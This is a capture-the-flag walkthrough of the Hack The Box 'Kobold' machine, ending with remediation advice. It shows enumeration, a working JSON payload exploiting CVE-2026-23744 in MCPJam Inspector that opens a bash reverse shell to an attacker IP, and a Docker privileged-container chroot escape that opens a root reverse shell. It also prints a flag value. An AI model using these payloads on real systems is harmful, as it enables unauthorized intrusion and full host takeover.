/ 01

The Challenge

Kobold is an Easy difficulty Linux machine on Hack The Box that tests skills in web enumeration, API exploitation, and container breakout techniques. The machine runs several web services, including an MCP (Model Context Protocol) Inspector dashboard that is vulnerable to unauthenticated Remote Code Execution (CVE-2026-23744). Initial access grants a shell as the user 'ben', who belongs to the 'operator' group and can switch to the 'docker' group. From there, a privileged Docker container with the host filesystem mounted provides root access.

This machine demonstrates how exposed management interfaces and improper container isolation can lead to complete system compromise, even on a hardened system with all modern mitigations enabled.

Phase 1: Reconnaissance

The first step in any penetration test is understanding the target's attack surface. I performed a full port scan using Nmap with service version detection and default scripts.

1.1 Port Scanning

nmap -sC -sV -Pn -p- 10.129.245.50 --min-rate 1000 -oN kobold.nmap

Command Breakdown:

  • -sC - Runs default NSE (Nmap Scripting Engine) scripts for service detection
  • -sV - Enables version detection to identify service versions
  • -Pn - Skips host discovery (assumes host is up) - necessary because the machine blocks ICMP ping probes
  • -p- - Scans all 65535 ports (not just common ones)
  • --min-rate 1000 - Speeds up the scan by sending at least 1000 packets per second
  • -oN kobold.nmap - Saves output in normal format to a file
PortStateServiceNotes
22/tcp open SSH OpenSSH 8.2p1 (requires credentials)
80/tcp open HTTP nginx/1.24.0 (redirects to HTTPS)
443/tcp open HTTPS nginx/1.24.0, Wildcard cert: *.kobold.htb
3552/tcp open HTTP Arcane Dashboard (non-TLS)
Key Discovery: The SSL certificate on port 443 contains a wildcard entry *.kobold.htb. This is a critical finding because it indicates that multiple subdomains exist (e.g., admin.kobold.htb, mcp.kobold.htb, etc.). Wildcard certificates are common in production environments but also expand the attack surface significantly.

I attempted to access port 3552 with both HTTP and HTTPS:

curl http://10.129.245.50:3552
# Connection refused

curl -k https://10.129.245.50:3552
# TLS connect error: wrong version number

The TLS error indicates that port 3552 is serving plain HTTP, not HTTPS. The -k flag tells curl to ignore SSL certificate errors, but the error persists because the protocol mismatch prevents any communication.

1.2 Subdomain Enumeration

First, I added the main domain to my /etc/hosts file. This is necessary because the web server uses virtual host routing - it serves different content based on the Host header.

echo "10.129.245.50 kobold.htb" | sudo tee -a /etc/hosts

Next, I performed subdomain enumeration using a bash one-liner. While tools like ffuf or gobuster are more efficient, this simple loop works well for small wordlists:

for sub in www mail ftp admin mcp bin dev api test; do
    echo -n "$sub.kobold.htb: "
    curl -k -s -o /dev/null -w "%{http_code}\n" -H "Host: $sub.kobold.htb" https://10.129.245.50
done

Command Breakdown:

  • for sub in ... - Iterates through a list of common subdomain names
  • echo -n "$sub.kobold.htb: " - Prints the subdomain without a newline
  • curl -k - Ignores SSL certificate verification (the certificate is self-signed)
  • -s - Silent mode (no progress meter or error messages)
  • -o /dev/null - Discards the response body (we only care about the status code)
  • -w "%{http_code}\n" - Prints only the HTTP status code
  • -H "Host: $sub.kobold.htb" - Sets the Host header to the subdomain we're testing
SubdomainStatusService
mcp.kobold.htb 200 OK MCPJam Inspector v1.4.2
bin.kobold.htb 200 OK PrivateBin instance
www/admin/mail/etc 302 Redirect Redirection to main site

The mcp.kobold.htb subdomain returned a 200 status code, indicating it's active. I added it to my hosts file:

echo "10.129.245.50 mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
Why subdomain enumeration matters: Many web applications hide administrative interfaces, APIs, or development versions behind subdomains. These subdomains often have weaker security controls than the main domain because they're not intended for public access. In this case, the MCP dashboard was completely exposed and vulnerable.

Phase 2: Vulnerability Discovery

2.1 MCPJam Inspector

Navigating to https://mcp.kobold.htb in a browser revealed the MCPJam Inspector dashboard version 1.4.2. MCP (Model Context Protocol) is a protocol for AI assistants to interact with external tools and data sources. The Inspector is a debugging tool that allows developers to test MCP servers.

Researching this version quickly revealed a critical vulnerability: CVE-2026-23744 - Unauthenticated Remote Code Execution in MCPJam Inspector versions prior to 1.4.3.

Vulnerability Details: The /api/mcp/connect endpoint accepts a JSON payload containing serverConfig.command and serverConfig.args parameters. These values are passed directly to child_process.spawn() without any validation or sanitization. This means an attacker can specify arbitrary system commands to be executed on the server.

2.2 Understanding the Vulnerability

The vulnerable endpoint expects a POST request with the following structure:

POST /api/mcp/connect
Content-Type: application/json

{
    "serverConfig": {
        "command": "bash",           // The executable to run
        "args": ["-c", "command"],   // Arguments passed to the executable
        "env": {}                    // Optional environment variables
    },
    "serverId": "pwn"                // A unique identifier for the connection
}

When the server receives this request, it spawns a child process using Node.js's child_process.spawn() function. Because the command and args fields are not validated, an attacker can inject any system command.

This is essentially a command injection vulnerability, but it's exposed through an API endpoint rather than a traditional web form. The lack of authentication makes it particularly dangerous - anyone who can reach the endpoint can execute commands.

Phase 3: Initial Foothold

3.1 Setting Up a Listener

Before sending the exploit, I started a netcat listener on my attack machine. Netcat (nc) is a versatile networking tool that can read from and write to network connections. Using it as a listener allows me to catch incoming reverse shells.

# Terminal 1 - On my attack machine (IP: 10.10.14.29)
nc -lvnp 4444

Flag Breakdown:

  • -l - Listen mode (act as a server)
  • -v - Verbose output (shows connection details)
  • -n - No DNS resolution (faster, uses IP addresses directly)
  • -p 4444 - Listen on port 4444

This command opens port 4444 on my attack machine and waits for an incoming connection. When the target machine connects, I'll get an interactive shell.

3.2 Sending the Exploit

The exploit payload is a reverse shell command. A reverse shell is a technique where the target machine initiates a connection back to the attacker's machine, bypassing firewall rules that block incoming connections.

# Terminal 2 - Send the exploit
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.29/4444 0>&1"],"env":{}},"serverId":"pwn"}'

Command Breakdown:

  • curl -k - Makes an HTTPS request without verifying the SSL certificate
  • -H "Content-Type: application/json" - Sets the HTTP header to indicate JSON data
  • -d '{...}' - The POST data (JSON payload)

Reverse Shell Payload Explanation:

bash -i >& /dev/tcp/10.10.14.29/4444 0>&1

This is a classic bash reverse shell one-liner. Let me break it down:

  • bash -i - Starts an interactive bash shell
  • >& - Redirects both stdout (standard output) and stderr (standard error)
  • /dev/tcp/10.10.14.29/4444 - A special device file that creates a TCP connection to the specified IP and port
  • 0>&1 - Redirects stdin (standard input) to stdout, so commands typed on the attacker's machine are sent to the shell

Essentially, this command tells bash to connect to my machine on port 4444 and send all output there, while also receiving input from there.

3.3 Successful Shell Access

# Terminal 1 output
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.129.245.50] 40262
bash: cannot set terminal process group (1530): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$

The connection succeeded! I'm now logged in as the user ben. The warnings about terminal process group and job control are normal when receiving a reverse shell - they indicate that the shell isn't fully interactive yet. I'll fix that in the next step.

Notice that the curl command returned a 504 Gateway Timeout error. This is because the API endpoint hangs while waiting for the MCP server to respond, but the reverse shell was already executed successfully before the timeout occurred. The 504 error is irrelevant - we have our shell.

3.4 Stabilizing the Shell

The initial shell is unstable - commands like su or sudo may fail, and the terminal lacks features like tab completion and job control. To fix this, I used a Python pty trick:

# In the reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z to background the shell
stty raw -echo; fg
# Press Enter twice
export TERM=xterm

Explanation:

  • python3 -c 'import pty;pty.spawn("/bin/bash")' - Creates a pseudo-terminal (pty) that mimics a real terminal
  • Ctrl+Z - Suspends the netcat process and returns control to my local terminal
  • stty raw -echo; fg - Disables local echo and line buffering, then brings the shell back to the foreground
  • export TERM=xterm - Sets the terminal type to enable features like clear screen and color output

After these steps, the shell behaves like a normal SSH session.

3.5 User Flag

With a stable shell, I navigated to ben's home directory and retrieved the user flag:

Phase 4: Privilege Escalation Enumeration

With a shell as 'ben', I began enumerating the system for privilege escalation vectors. The goal is to find a way to gain root access.

4.1 Checking User Privileges

ben@kobold:/$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

ben@kobold:/$ whoami
ben

The id command shows the user's identity and group memberships:

  • uid=1001(ben) - User ID (1001) and username (ben)
  • gid=1001(ben) - Primary group ID
  • groups=1001(ben),37(operator) - Supplementary groups. Group ID 37 is the 'operator' group.

The 'operator' group is interesting - on some systems, members of this group can perform certain administrative tasks, including switching to other groups.

4.2 Discovering Docker Access

I checked if the system has Docker installed and whether I can access it:

ben@kobold:/$ docker images
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: ...
connect: permission denied

The error indicates Docker is installed but I don't have permission to use it. The Docker daemon socket (/var/run/docker.sock) is only accessible to users in the 'docker' group.

However, being in the 'operator' group might allow me to switch to the 'docker' group:

ben@kobold:/$ newgrp docker
ben@kobold:/$ sg docker -c "id"
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)

Command Explanation:

  • newgrp docker - Starts a new shell with the 'docker' group as the primary group. This may hang or fail if the user isn't authorized.
  • sg docker -c "id" - Executes the id command with the 'docker' group. The sg command (switch group) is more reliable than newgrp in restricted environments.

The output shows that the command succeeded - the effective group ID (gid) is now 111 (docker). This means I can use Docker commands!

4.3 Listing Docker Images

With Docker access confirmed, I listed the available images:

ben@kobold:/$ docker images
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   2 months ago   922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB

Two images are available: mysql:latest (a full MySQL database image) and privatebin/nginx-fpm-alpine (a lightweight Alpine-based image). Both can be used for privilege escalation, but mysql:latest includes bash and other useful tools.

Why Docker leads to root: The Docker daemon runs as root. When a user is in the 'docker' group, they can effectively execute commands as root by running privileged containers. The --privileged flag removes all container isolation, and mounting the host's filesystem allows complete access to the host system.
/ 06

Phase 5: Docker Breakout to Root

5.1 The Breakout Technique

The privilege escalation technique uses a privileged container with the host's root filesystem mounted inside it. By using chroot to change the container's root directory to the host's root, I can execute commands directly on the host system as root.

Here's the breakdown of what each part of the command does:

docker run --rm --privileged -v /:/mnt mysql:latest sh -c "chroot /mnt bash -c 'bash -i >& /dev/tcp/10.10.14.29/5555 0>&1'"

Docker flags:

  • run - Creates and starts a new container
  • --rm - Automatically removes the container when it exits (cleanup)
  • --privileged - Grants the container all capabilities, including access to host devices and the ability to mount filesystems
  • -v /:/mnt - Mounts the host's root directory (/) to /mnt inside the container
  • mysql:latest - The image to use (includes bash)
  • sh -c "..." - Executes a command in the container's shell

The inner command:

  • chroot /mnt - Changes the root directory to /mnt (which is the host's /). After this, the container sees the host's filesystem as its root.
  • bash -c '...' - Executes a bash reverse shell on the host system

Essentially, this command creates a container that becomes the host system by changing its root to the host's mounted filesystem. The reverse shell runs in the context of the host's root user.

5.2 Setting Up the Root Listener

Before executing the breakout, I started another netcat listener on a different port:

# Terminal 2 - New listener for root shell
nc -lvnp 5555

5.3 Executing the Breakout

From the ben shell, I executed the Docker command:

ben@kobold:/$ docker run --rm --privileged -v /:/mnt mysql:latest sh -c "chroot /mnt bash -c 'bash -i >& /dev/tcp/10.10.14.29/5555 0>&1'"

5.4 Root Shell Obtained

# Terminal 2 output
nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.29] from (UNKNOWN) [10.129.245.50] 36348
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@a9a73e507acc:/#

The prompt root@a9a73e507acc indicates I'm root inside a Docker container (the container ID is a9a73e507acc). But because I used chroot, this container is actually operating on the host's filesystem. Commands I run here affect the host system.

Verifying Root Access: To confirm I have full control over the host, I could run commands like cat /etc/shadow or ps aux to see host processes. The container ID is just a namespace - the filesystem is the real host.

5.5 Alternative - Direct Flag Reading

If an interactive shell isn't needed, I can read the root flag directly without starting a listener:

ben@kobold:/$ docker run --rm --privileged -v /:/mnt mysql:latest cat /mnt/root/root.txt
f7524282491e6bcefba11c18c4f1cfbf

This is more efficient for CTFs where you just need the flag. The cat command reads the file and exits, and Docker automatically removes the container.

Key Takeaways & Lessons Learned

8.1 Web Enumeration

  • Always check SSL certificates - Wildcard entries like *.kobold.htb are strong indicators that subdomains exist and should be enumerated.
  • Use multiple subdomain discovery methods - DNS fuzzing, certificate transparency logs, and virtual host fuzzing each reveal different subdomains.
  • Hidden directories and API endpoints are common attack surfaces - The /api/mcp/connect endpoint had no authentication and allowed command execution.

8.2 Command Injection

  • User input should never be passed directly to system commands - The MCPJam Inspector passed the command and args fields directly to child_process.spawn() without validation.
  • Even "internal" APIs need authentication - The developers likely assumed this endpoint would only be used by trusted internal services, but it was exposed to the internet.
  • Reverse shells are versatile - The bash reverse shell works on almost any Linux system and is reliable for establishing interactive access.

8.3 Docker Security

  • Membership in the 'docker' group is equivalent to root - Users in this group can run privileged containers and mount the host filesystem, completely bypassing isolation.
  • The 'operator' group can often switch to other groups - The sg command allows temporary group switching if the user has appropriate permissions.
  • Privileged containers should be avoided in production - The --privileged flag disables all security features and should only be used for specific, well-understood use cases.
  • Host filesystem mounts are dangerous - Mounting / inside a container allows container breakout via chroot.

8.4 General Best Practices

  • Stabilize reverse shells immediately - The Python PTY trick makes a reverse shell usable for complex commands like sudo or text editors.
  • Enumerate thoroughly after gaining a shell - Commands like id, groups, sudo -l, and checking for Docker access are essential first steps.
  • Keep multiple listeners ready - Having a listener on a different port for the privilege escalation phase ensures you don't lose your shell.
/ 09

Remediation Recommendations

To secure a system like Kobold against these attacks, the following changes should be implemented:

9.1 MCPJam Inspector

  • Update to version 1.4.3 or higher - The CVE-2026-23744 vulnerability is patched in newer versions.
  • Add authentication to the API endpoint - Even internal APIs should require API keys or session tokens.
  • Validate and sanitize all user input - Command parameters should be validated against an allowlist of safe values.

9.2 Docker Configuration

  • Remove users from the 'docker' group unless absolutely necessary - Regular users should not have Docker access.
  • Use rootless Docker - Running Docker in rootless mode prevents container breakout from escalating to host root.
  • Implement container security policies - Use AppArmor, SELinux, or seccomp profiles to restrict container capabilities.
  • Audit the 'operator' group membership - The 'operator' group should have minimal privileges and should not allow switching to the 'docker' group.

9.3 General Hardening

  • Use a Web Application Firewall (WAF) - Can detect and block command injection attempts.
  • Implement principle of least privilege - Users should have only the permissions they need to perform their jobs.
  • Regular vulnerability scanning - Automated scans would have detected the outdated MCPJam version.
